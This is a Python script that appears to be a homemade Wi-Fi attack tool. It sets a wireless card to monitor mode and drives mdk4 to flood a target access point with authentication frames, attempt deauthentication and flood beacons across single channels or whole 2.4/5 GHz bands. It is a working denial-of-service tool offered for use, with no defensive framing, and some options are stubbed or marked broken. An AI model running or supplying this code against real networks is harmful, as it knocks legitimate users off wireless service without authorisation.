#!/usr/bin/env python

import time,sys,subprocess,os
from scapy.all import Dot11, Dot11Deauth, Dot11Disas, RadioTap, Dot11Elt, sendp, sniff, conf, EAPOL, Dot11EltRSN

def main():
	Set_Monitor()
	try:
		while True:
			Prompt_User()
	except KeyboardInterrupt:
		Exit_Script()

def Prompt_User():
	opt = 99
	while not (1 <= opt <= 5):
		opt = Get_Input()
	if opt == 1:
		pass
	if opt == 2:
		bssid = input('Enter BSSID of Target: ')
		print(f"Started attack on {bssid}")
		subprocess.run(f"mdk4 wlan0 a -a {bssid} > /dev/null &", shell=True, executable="/bin/bash")
		exit = input('Input anything to end attack: ')
		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
		print(f"Ended attack on {bssid}")
		time.sleep(2)
	if opt == 3:
		#Not Currently Working
		bssid = input('Enter BSSID of Target: ')
		subprocess.run(f"mdk4 wlan0 d -B {bssid} > /dev/null &", shell=True, executable="/bin/bash")
		exit = input('Input anything to end attack: ')
		subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
		print(f"Ended attack on {bssid}")
		time.sleep(2)
	if opt == 4:
		sendPrompt = True
		while sendPrompt:
			sendPrompt = Beacon_Prompt()
		time.sleep(2)
	if opt == 5:
		Exit_Script()

def Beacon_Prompt():
	channel_list = [
	1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11,			# 2.4 GHz Channels
	32, 36, 40, 44, 48,					# UNII-1 (Low Band)
	52, 56, 60, 64,						# UNII-2 (Middle Band)
	100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,	# UNII-2 Extended
	149, 153, 157, 161, 165]				# UNII-3 (High Band)
	bfType = input("""
bg.  Full 2.4GHz band
a.   Full 5GHz band
#.   Attack specificed channel (if 2.4GHz or 5GHz channel)
q.   Quit
Enter selected target for beacon flood DoS attack: """)
	if bfType.casefold() == "bg".casefold():
		print("Started attack on 2.4GHz band")
		index = 0
		Set_Channel(channel_list[index])
		for i in range(5000):
			subprocess.run("mdk4 wlan0 b > /dev/null &", shell=True, executable="/bin/bash")
		try:
			while True:
				time.sleep(0.02)
				index += 1
				Set_Channel(channel_list[index%11])
		except KeyboardInterrupt:
			print("Ended attack on 2.4GHz band")
			Exit_Script()
	if bfType.casefold() == "a".casefold():
		print("Started attack on 5GHz band")
		index = 11
		Set_Channel(channel_list[index])
		for i in range(5000):
			subprocess.run("mdk4 wlan0 b > /dev/null &", shell=True, executable="/bin/bash")
		try:
			while True:
				time.sleep(0.02)
				index += 1
				Set_Channel(channel_list[index%25+11])
		except KeyboardInterrupt:
			print("Ended attack on 5GHz band")
			Exit_Script()
	if bfType.casefold() == "q".casefold():
		return False
	try:
		channel = int(bfType)
		if channel in channel_list:
			print(f"Started attack on channel {channel}")
			Set_Channel(channel)
			for i in range(5000):
				subprocess.run(f"mdk4 wlan0 b -c {channel} > /dev/null &", shell=True, executable="/bin/bash")
			exit = input('Input anything to end attack: ')
			subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
			print(f"Ended attack on {channel}")
			return False
		else :
			return True
	except:
		return True

def Exit_Script():
	print("Ending Script")
	subprocess.run("pkill mdk4", shell=True, executable="/bin/bash")
	Set_Managed()
	print("Goodbye")
	sys.exit()

def Set_Monitor():
	subprocess.run("sudo airmon-ng check kill > /dev/null", shell=True, executable="/bin/bash")
	subprocess.run("sudo airmon-ng start wlan0 > /dev/null", shell=True, executable="/bin/bash")

def Set_Managed():
	subprocess.run("systemctl start NetworkManager", shell=True, executable="/bin/bash")

def Set_Channel(channel):
	change_channel="sudo iwconfig wlan0 channel " + str(channel)
	subprocess.run(change_channel, shell=True, executable="/bin/bash")

def Print_Options():
	options ="""
1. WPA2 cracking attack
2. DoS w/ authentication flood
3. DoS w/ deauth attack
4. DoS w/ beacon flood
5. Quit"""
	subprocess.run("clear", shell=True, executable="/bin/bash")
	print(options)
	option = input('Enter Selection: ')
	return(option)

def Get_Input():
	input = Print_Options()
	try:
		input = int(input)
	except:
		input = int(99)
	return input



if __name__ == '__main__':
    main()
